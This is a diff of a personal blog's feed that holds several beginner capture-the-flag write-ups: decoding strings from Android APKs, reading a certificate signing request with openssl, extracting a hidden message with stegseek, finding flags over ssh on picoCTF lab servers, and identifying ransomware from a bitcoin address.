+<p><img src="https://user-images.githubusercontent.com/98275198/270126136-2f94ec52-5eed-491c-8458-331bd614d8a0.png" alt="image" /></p>
 
+<p>Trying to decode it, we get a string <code class="language-plaintext highlighter-rouge">ekortsyek</code> that initially I thought was the password for the notes app.</p>
 
+<p><img src="https://user-images.githubusercontent.com/98275198/270126988-6f2467ed-48de-4d11-accb-e84b91813ba2.png" alt="image" /></p>
 
-      ReadMyCert
+<p>Now we need a script to help us read the flag and secret.</p>
+<pre><code class="language-python3">#!/usr/bin/python3
 
-AUTHOR: SUNDAY JACOB NWANYIM
+import base64
 
-Description
+def decode_base64(data):
+    return base64.b64decode(data).decode('utf-8')
+
+def xor_strings(s1, s2):
+    return ''.join(chr(a ^ b) for a, b in zip(s1, s2))
+
+decoded_secret = decode_base64("ZWtvcnRzeWVr")[::-1]
+
+decoded_flag = decode_base64("DQkYFA8aWxkBCFUdQBAtHB8XWgseACtGXgURNBZKEAZBGxgY")
+
+
+flag = xor_strings(decoded_flag.encode('utf-8'), (decoded_secret * len(decoded_flag)).encode('utf-8'))
+
+print(flag)
+          
+</code></pre>
+<p>Running the script, we get our flag.</p>
+
+<p><img src="https://user-images.githubusercontent.com/98275198/270127902-d452c949-dfcb-48e9-a06f-7d8cf2e040e3.png" alt="image" /></p>
+
+<p>I was not able to solve the other Android challenges during the CTF but will definitely look into them later.</p>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Web" /><category term="SheHacks Intervarsity CTF" /><category term="ctfs" /><category term="mobile" /><category term="cybersecurity" /><summary type="html"><![CDATA[Secured Notes I created an application to retrieve my secrets. Is it realy secured? SecuredNotes.apk]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/secured-notes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/secured-notes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Multilingual</title><link href="http://localhost:4000/posts/multilingual/" rel="alternate" type="text/html" title="Multilingual" /><published>2023-09-23T22:27:00+03:00</published><updated>2023-09-23T23:11:33+03:00</updated><id>http://localhost:4000/posts/multilingual</id><content type="html" xml:base="http://localhost:4000/posts/multilingual/"><![CDATA[<h1 id="shehacks-intervarsity-ctf">SheHacks Intervarsity CTF</h1>
+
+<p>Over the weekend, I had the opportunity of attending the Intervarsity CTF organized by Shehacks Kenya 
+whith my school’s CTF team @Dumb1d0r3♾️🟰♾️</p>
+
+<p><img src="https://user-images.githubusercontent.com/98275198/270124581-f07bcdb0-aecb-4667-a1b3-99a28083c024.png" alt="image" />
+I and my team solved some few challenges and we had fun playing and learning.</p>
+
+<p>I’ll take you through some of the challenges we solved.</p>
+
+<h1 id="android">Android</h1>
+<h2 id="multilingual">Multilingual</h2>
+<p>The first challenge was called <code class="language-plaintext highlighter-rouge">Multilingual</code> and was pretty easy.</p>
+
+<p><em>I can’t seem to pick out the hidden message. Can you assit? <a href="https://shehacks.ciphercode.dev/files/301764f949fdfc5c86d24e1ee7bac16d/multilingual.apk">multilingual.apk</a></em></p>
+
+<h2 id="solution">solution</h2>
+<p>I solved this one quite easy. We get an android APK file and we are to find the flag.</p>
+
+<p><img src="https://user-images.githubusercontent.com/98275198/270125053-1720c4d7-f9fb-41fb-9542-5c3274f11b1b.png" alt="image" /></p>
+
+<p>I first decompile the application with <code class="language-plaintext highlighter-rouge">apktool</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/98275198/270125136-4c2f5015-4391-44f5-b164-2b7350e98ecf.png" alt="image" /></p>
+
+<p>I then went ahead to grep the strings with words like <code class="language-plaintext highlighter-rouge">flag</code> and was able to capture interesting encoded strings.</p>
+
+<p><img src="https://user-images.githubusercontent.com/98275198/270125232-be3cc680-2ee8-4e4d-a9ef-bc742901ef2f.png" alt="image" /></p>
+
+<p>I then went ahead to arrange the identified parts in the order <code class="language-plaintext highlighter-rouge">part1</code>,<code class="language-plaintext highlighter-rouge">part2</code>,<code class="language-plaintext highlighter-rouge">part3</code> to form <code class="language-plaintext highlighter-rouge">ZmxhZ3tDNGxsX00zX011bHQxbDFuZ3U0bH0=</code></p>
+
+<p>This been base64 encoded, I decoded it using <code class="language-plaintext highlighter-rouge">echo "ZmxhZ3tDNGxsX00zX011bHQxbDFuZ3U0bH0" | base64 -d</code> and we got our flag.</p>
+
+<p><img src="https://user-images.githubusercontent.com/98275198/270125429-2add6c3a-1ce4-42ac-a312-199b92b3eb7e.png" alt="image" /></p>
+
+<p>That was it for that challenge.</p>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Web" /><category term="SheHacks Intervarsity CTF" /><category term="mobile" /><category term="cybersecurity" /><summary type="html"><![CDATA[SheHacks Intervarsity CTF]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/multi.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/multi.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pico CTF (ReadMyCert)</title><link href="http://localhost:4000/posts/readmycert/" rel="alternate" type="text/html" title="Pico CTF (ReadMyCert)" /><published>2023-05-14T18:33:00+03:00</published><updated>2023-05-14T18:33:00+03:00</updated><id>http://localhost:4000/posts/readmycert</id><content type="html" xml:base="http://localhost:4000/posts/readmycert/"><![CDATA[<h2 id="readmycert">ReadMyCert</h2>
+
+<p>AUTHOR: SUNDAY JACOB NWANYIM</p>
+
+<p>Description
 How about we take you on an adventure on exploring certificate signing requests
-Take a look at this CSR file here
+Take a look at this CSR file <a href="https://artifacts.picoctf.net/c/422/readmycert.csr">here</a></p>
 
-Solution
+<h2 id="solution">Solution</h2>
 
-In this challenge, we shall learn how to read CSR(certificate signing requests) using openssl
+<p>In this challenge, we shall learn how to read CSR(certificate signing requests) using <code class="language-plaintext highlighter-rouge">openssl</code>
 OpenSSL is a widely-used cryptographic library that includes a command-line tool for working with CSRs.
-Let’s solve this cha...
-    </summary>
-  
+Let’s solve this challenge, shall we?</p>
+<ol>
+  <li>Download the given <code class="language-plaintext highlighter-rouge">readmycert.csr</code>.</li>
+  <li>Use the <code class="language-plaintext highlighter-rouge">file</code> to read the certificates properties.
+<img src="https://user-images.githubusercontent.com/98275198/238194166-eeef8f47-cdde-4d50-9f01-8d64c68a162d.png" alt="image" /></li>
+  <li>Let’s view the contents of the certificate by running <code class="language-plaintext highlighter-rouge">cat readmycert.csr</code>
+<img src="https://user-images.githubusercontent.com/98275198/238194243-944fbb77-e5e0-47e4-92e1-adf230112f20.png" alt="image" /></li>
+  <li>Now, lets get all details of the CSR using the command <code class="language-plaintext highlighter-rouge">openssl req -in readmycert.csr -noout -text</code> which will display the CSR details, including the subject, organization, common name, and other relevant information.</li>
+  <li>Lets understand the commands in details.
+    <ul>
+      <li>
+        <dl>
+          <dt>Flag/Option: <code class="language-plaintext highlighter-rouge">openssl</code></dt>
+          <dd>This is the command-line tool used to perform various cryptographic operations using the OpenSSL library.</dd>
+        </dl>
+      </li>
+      <li>
+        <dl>
+          <dt>Flag/Option: <code class="language-plaintext highlighter-rouge">req</code></dt>
+          <dd>It is a subcommand of OpenSSL specifically used for working with certificate requests, including CSRs.</dd>
+        </dl>
+      </li>
+      <li>
+        <dl>
+          <dt>Flag/Option: <code class="language-plaintext highlighter-rouge">-in your_csr_file.csr</code></dt>
+          <dd>This flag specifies the input file for the CSR. Replace your_csr_file.csr with the actual path and filename of your CSR file.</dd>
+        </dl>
+      </li>
+      <li>
+        <dl>
+          <dt>Flag/Option: <code class="language-plaintext highlighter-rouge">-noout</code></dt>
+          <dd>This flag instructs OpenSSL not to output the actual certificate but only display the CSR’s text representation. It prevents generating any output other than the textual information.</dd>
+        </dl>
+      </li>
+      <li>
+        <dl>
+          <dt>Flag/Option: <code class="language-plaintext highlighter-rouge">-text</code></dt>
+          <dd>This flag tells OpenSSL to display the CSR details in a human-readable format. It provides a comprehensive view of the CSR’s contents, including the subject’s distinguished name (DN), public key information, and any other attributes included in the request.</dd>
+        </dl>
+      </li>
+    </ul>
+  </li>
+  <li>We get our flag in the subject of the certificate.
+<img src="https://user-images.githubusercontent.com/98275198/238194704-d37bcdde-2d83-45d8-8066-d7b9543edba8.png" alt="image" />
+That is it, I hope you learnt a thing or two from this challenge.</li>
+</ol>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Cryptography" /><category term="picoctf" /><category term="ctfs" /><category term="cryptography" /><category term="cybersecurity" /><summary type="html"><![CDATA[ReadMyCert]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/ReadMyCert.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/ReadMyCert.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pico CTF (HideToSee)</title><link href="http://localhost:4000/posts/HideToSee/" rel="alternate" type="text/html" title="Pico CTF (HideToSee)" /><published>2023-05-14T10:46:00+03:00</published><updated>2023-05-14T10:46:00+03:00</updated><id>http://localhost:4000/posts/HideToSee</id><content type="html" xml:base="http://localhost:4000/posts/HideToSee/"><![CDATA[<h2 id="hidetosee">HideToSee</h2>
 
-  </entry>
+<p>AUTHOR: SUNDAY JACOB NWANYIM</p>
 
-</feed>
+<p>Description
+How about some hide and seek heh?
+Look at this image <a href="https://artifacts.picoctf.net/c/237/atbash.jpg">here</a>.</p>
 
+<h2 id="solution">Solution</h2>
 
+<p>This challenge was tricky as it required some forensics and then understanding atbash cipher.
+Let’s get started, shall we?</p>
+<ol>
+  <li>Download the given image.</li>
+  <li>As I said, this challenge required some forensics skills.</li>
+  <li>Since the hint said we extract the image, I went to my forensics toolkit and chose <code class="language-plaintext highlighter-rouge">stegseek</code>.<br />
+Stegseek is a powerful command-line tool designed to detect and extract hidden messages or data concealed within various digital media files, such as images or audio files. It utilizes a technique called steganography, which involves hiding information within another file without arousing suspicion.</li>
+  <li>I used stegseek to bruteforce the image by running <code class="language-plaintext highlighter-rouge">stegseek atbash.jpg</code> 
+<img src="https://user-images.githubusercontent.com/98275198/238173319-bd774d57-86c6-4d7b-b0e3-808fd6f5b133.png" alt="image" /></li>
+  <li>Lucky us, we find the encrypted text and it is stored in <code class="language-plaintext highlighter-rouge">atbash.jpg.out</code>.</li>
+  <li>Let’s now cat the encrypted text by running <code class="language-plaintext highlighter-rouge">cat atbash.jpg.out</code>.
+<img src="https://user-images.githubusercontent.com/98275198/238173437-09c2bb26-96d7-4a35-be8a-fd137a948be9.png" alt="image" /></li>
+  <li>We get an atbash encrypted text. <code class="language-plaintext highlighter-rouge">krxlXGU{zgyzhs_xizxp_05y2z65z}</code>
+The Atbash cipher is a simple substitution cipher that operates by reversing the alphabet. It is one of the oldest known encryption techniques, dating back to ancient times. In this cipher, each letter of the alphabet is replaced with its corresponding letter from the opposite end.</li>
+  <li>I now head over to <a href="https://gchq.github.io/">cyberchef</a> which is a simple, intuitive web app for analysing and decoding data without having to deal with complex tools or programming languages.</li>
+  <li>Search for atbash cipher and place your encrypted text on the input box. 
+<img src="https://user-images.githubusercontent.com/98275198/238173672-d6bafd8a-758f-4a85-892f-3d7ce4e0a23d.png" alt="image" /></li>
+</ol>
+
+<p>We finally get our flag. That’s it read my other writeups and hack ethically.</p>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Cryptography" /><category term="picoctf" /><category term="ctfs" /><category term="cryptography" /><category term="cybersecurity" /><summary type="html"><![CDATA[HideToSee]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/atbash.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/atbash.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pico CTF (Chrono)</title><link href="http://localhost:4000/posts/chrono/" rel="alternate" type="text/html" title="Pico CTF (Chrono)" /><published>2023-05-12T20:27:00+03:00</published><updated>2024-11-12T18:20:19+03:00</updated><id>http://localhost:4000/posts/chrono</id><content type="html" xml:base="http://localhost:4000/posts/chrono/"><![CDATA[<h2 id="chrono">Chrono</h2>
+
+<p>AUTHOR: MUBARAK MIKAIL</p>
+
+<h3 id="description">Description</h3>
+<p>How to automate tasks to run at intervals on linux servers?
+Use ssh to connect to this server:
+Server: saturn.picoctf.net
+Port: 50213
+Username: picoplayer 
+Password: ekj2GJuiv4</p>
+
+<h2 id="solution">Solution</h2>
+<p>This was an easy one, It tested ones understanding of directories and linux in general.</p>
+
+<ol>
+  <li>First ssh to the challenge using the given creds. The ssh port is different on each spawn so 
+you have to use the port provided after launching the challenge.
+<code class="language-plaintext highlighter-rouge">ssh picoplayer@saturn.picoctf.net -p 50213 -vvv</code>
+<img src="https://user-images.githubusercontent.com/98275198/237017598-3802ad04-aab6-4212-9a1c-242e7841bf2c.png" alt="image" />
+I always append <code class="language-plaintext highlighter-rouge">-vvv</code> the <code class="language-plaintext highlighter-rouge">-vvv</code> option is used to increase the verbosity level of the SSH client. It enables detailed debugging and provides extensive output, including debugging messages and information about the SSH connection process.
+After connecting you are logged in as picoplayer
+<img src="https://user-images.githubusercontent.com/98275198/237012238-dd299deb-9557-4fb2-9ce7-fc77b4860230.png" alt="image" />
+Now we have to understand where folders on a linux system are stored</li>
+  <li>Now use <code class="language-plaintext highlighter-rouge">cd ..</code> 
+<img src="https://user-images.githubusercontent.com/98275198/237013287-2fcaac49-8498-4182-bd7e-a520f23142b6.png" alt="image" /></li>
+  <li>Again repeat <code class="language-plaintext highlighter-rouge">cd ..</code><br />
+<img src="https://user-images.githubusercontent.com/98275198/237013484-b4a47e20-8b6d-4cf2-afc6-af211661bf08.png" alt="image" /></li>
+  <li>You could also use the command <code class="language-plaintext highlighter-rouge">cd ../..</code></li>
+  <li>We are now able to see the folders available.</li>
+  <li>Interesting enough is the <code class="language-plaintext highlighter-rouge">challenge folder</code> 
+<img src="https://user-images.githubusercontent.com/98275198/237013913-f8ea219b-0393-4e34-9eb2-3c9e84798fe3.png" alt="image" /></li>
+  <li>Now lets <code class="language-plaintext highlighter-rouge">cd challenge</code> and <code class="language-plaintext highlighter-rouge">ls -la</code></li>
+  <li>We see an intesting dile <code class="language-plaintext highlighter-rouge">metadata.json</code></li>
+  <li>Now lets <code class="language-plaintext highlighter-rouge">cat</code> the <code class="language-plaintext highlighter-rouge">metadata.json</code></li>
+  <li>And we see our flag.
+<img src="https://user-images.githubusercontent.com/98275198/237018423-16cef8a9-f0c8-4c78-8ee0-f86681883543.png" alt="image" /></li>
+</ol>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Web" /><category term="picoctf" /><category term="ctfs" /><category term="general" /><category term="cybersecurity" /><summary type="html"><![CDATA[Chrono]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/chrono.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/chrono.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pico CTF (Money-ware)</title><link href="http://localhost:4000/posts/Money-ware/" rel="alternate" type="text/html" title="Pico CTF (Money-ware)" /><published>2023-05-12T20:22:00+03:00</published><updated>2023-05-12T20:22:00+03:00</updated><id>http://localhost:4000/posts/Money-ware</id><content type="html" xml:base="http://localhost:4000/posts/Money-ware/"><![CDATA[<h2 id="money-ware">Money-ware</h2>
+
+<p>AUTHOR: JUNI19</p>
+
+<h3 id="description">Description</h3>
+<p>Flag format: picoCTF{Malwarename}
+The first letter of the malware name should be capitalized and the rest lowercase.
+Your friend just got hacked and has been asked to pay some bitcoins to
+1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks 
+you for advice. Can you identify what malware he’s being a victim of?</p>
+
+<h2 id="solution">Solution</h2>
+<p>The name of the challenge was a play with words <code class="language-plaintext highlighter-rouge">Money-ware</code>  I translated it to <code class="language-plaintext highlighter-rouge">malware</code> .
+I did a simple google search of the bitcoin address and appended the tag malware at the end
+<code class="language-plaintext highlighter-rouge">google</code>:<code class="language-plaintext highlighter-rouge">1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX malware</code>
+<img src="https://user-images.githubusercontent.com/98275198/237025626-77e4193c-2019-45d5-8070-6738eaa97f92.png" alt="image" />
+Eazy peazy</p>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Web" /><category term="picoctf" /><category term="ctfs" /><category term="web" /><category term="cybersecurity" /><summary type="html"><![CDATA[Money-ware]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/money-ware.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/money-ware.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pico CTF (Permissions)</title><link href="http://localhost:4000/posts/permissions/" rel="alternate" type="text/html" title="Pico CTF (Permissions)" /><published>2023-05-12T20:22:00+03:00</published><updated>2023-05-12T20:22:00+03:00</updated><id>http://localhost:4000/posts/permissions</id><content type="html" xml:base="http://localhost:4000/posts/permissions/"><![CDATA[<h2 id="permissions">Permissions</h2>
+
+<p>AUTHOR: GEOFFREY NJOGU</p>
+
+<p>Description
+Can you read files in the root file?
+Additional details will be available after launching your challenge instance.</p>
+
+<p>After starting the challenge we get more info
+The system admin has provisioned an account for you on the main server:
+ssh -p 56038 picoplayer@saturn.picoctf.net
+Password: Sd9KYTm5kr
+Can you login and read the root file?</p>
+
+<h2 id="solution">Solution</h2>
+<p>Remember the challenge <code class="language-plaintext highlighter-rouge">chrono</code>, well this also tests the same concept.</p>
+<ol>
+  <li>First ssh to the server 
+<code class="language-plaintext highlighter-rouge">ssh -p 56038 picoplayer@saturn.picoctf.net</code>
+<img src="https://user-images.githubusercontent.com/98275198/237027427-21a17fc5-a7e5-4e85-b004-5f6ca9c8471c.png" alt="image" /></li>
+  <li>Navigate to root folders <code class="language-plaintext highlighter-rouge">cd ../..</code></li>
+  <li>We see a folder <code class="language-plaintext highlighter-rouge">challenge</code></li>
+  <li>On the folder there is a file <code class="language-plaintext highlighter-rouge">metadata.json</code></li>
+  <li>When we cat the file, we get our flag.
+<img src="https://user-images.githubusercontent.com/98275198/237028324-64f2b1c5-6b0b-4b30-bd19-9ab989e548e8.png" alt="image" /></li>
+</ol>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Web" /><category term="picoctf" /><category term="ctfs" /><category term="web" /><category term="cybersecurity" /><summary type="html"><![CDATA[Permissions]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/permissions.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/permissions.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
